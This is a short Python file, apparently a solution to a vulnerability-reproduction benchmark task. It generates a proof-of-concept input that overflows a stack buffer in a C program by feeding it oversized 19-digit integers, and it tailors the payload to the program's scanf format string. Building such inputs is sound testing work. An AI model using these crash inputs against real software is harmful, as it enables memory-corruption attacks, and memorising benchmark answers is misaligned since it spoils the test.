import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability description indicates a stack buffer overflow due to
        an integer format string exceeding 32 bytes. Specifically, it mentions
        maximum width (19 digits) and maximum precision (19 digits).
        
        A payload of two 19-digit integers separated by a space and followed 
        by a newline is exactly 40 bytes:
        19 (digits) + 1 (space) + 19 (digits) + 1 (newline) = 40.
        This matches the ground-truth PoC length.
        
        We attempt to parse the source code to confirm the input format (e.g. scanf separators),
        but fallback to the 40-byte payload if analysis fails.
        """
        default_payload = b"9999999999999999999 9999999999999999999\n"
        
        try:
            with tarfile.open(src_path, 'r') as tar:
                # Locate C source files
                c_files = [m for m in tar.getmembers() if m.name.endswith('.c')]
                if not c_files:
                    return default_payload
                
                # Prioritize main.c or vuln.c if multiple files exist
                target_member = c_files[0]
                for m in c_files:
                    if 'main' in m.name or 'vuln' in m.name:
                        target_member = m
                        break
                
                f = tar.extractfile(target_member)
                if not f:
                    return default_payload
                
                content = f.read().decode('utf-8', errors='ignore')
                
                # Look for scanf usage to determine input delimiters
                match = re.search(r'scanf\s*\(\s*"([^"]+)"', content)
                if match:
                    fmt_str = match.group(1)
                    
                    # Regex for C integer format specifiers (e.g., %d, %lu, %19lld)
                    specifier_re = r'%[-+ #0]*[\d\.]*(?:hh|h|l|ll|j|z|t|L)?[diuoxX]'
                    
                    # Split format string by specifiers to find literal separators
                    parts = re.split(specifier_re, fmt_str)
                    
                    # If specifiers were found, construct payload using the large integer
                    if len(parts) > 1:
                        large_int = b"9999999999999999999"
                        payload = b""
                        
                        for i in range(len(parts) - 1):
                            payload += parts[i].encode('utf-8')
                            payload += large_int
                        payload += parts[-1].encode('utf-8')
                        
                        if not payload.endswith(b'\n'):
                            payload += b'\n'
                            
                        return payload

        except Exception:
            pass
            
        return default_payload